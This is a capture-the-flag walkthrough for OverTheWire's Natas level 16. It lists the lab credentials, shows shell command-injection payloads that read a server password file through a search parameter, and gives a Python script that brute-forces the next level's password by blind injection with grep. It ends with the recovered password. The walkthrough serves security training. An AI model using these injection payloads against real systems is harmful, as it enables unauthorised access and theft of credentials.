# Natas Level 16
The ***URL*** to which you need to connect is *http://natas16.natas.labs.overthewire.org*. The ***username*** is *natas16* and the ***password*** is *WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*. 

Lets check the [viewsource](http://natas16.natas.labs.overthewire.org/index-source.html) link.
Lets try to inject "$(cat /etc/natas_webpass/natas17)" nothing showed up.

And when we try:
```
animals$(grep a /etc/natas_webpass/natas17)
```
Seems like when we grep a character in the natas17 file we see that if the character is in the file or not by the output of the website.
```Python
import requests, string

URL         = "http://natas16.natas.labs.overthewire.org/"
username    = "natas16"
password    = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

result      = ""
characters   = string.ascii_lowercase + string.ascii_uppercase +  "0123456789"

for i in range(32):
    # Assuming that the password is a 32 lenght string just like in the previous levels.
    for c in characters:
        response = requests.get(URL + '?needle=animals$(grep ^' + result + c + ' /etc/natas_webpass/natas17)' , auth=(username, password))
        if "animals" not in response.text:
            result += c

print(result)
```

```
The Password is : 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

